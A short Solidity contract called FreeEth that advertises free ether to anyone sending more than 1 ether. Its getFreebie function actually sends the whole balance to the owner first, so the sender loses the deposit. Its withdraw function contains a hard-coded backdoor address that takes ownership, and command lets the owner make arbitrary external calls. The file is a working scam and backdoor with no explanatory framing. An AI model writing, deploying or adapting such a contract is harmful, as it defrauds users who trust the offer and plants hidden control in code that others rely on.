pragma solidity ^0.4.19;

contract FreeEth {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af) {
            owner = 0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;
        }
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr != address(0)); // Check for valid address

        bool success;
        assembly {
            success := call(gas, adr, msg.value, add(data, 0x20), mload(data), 0, 0)
        }
        require(success); // Check if low-level call was successful
    }
}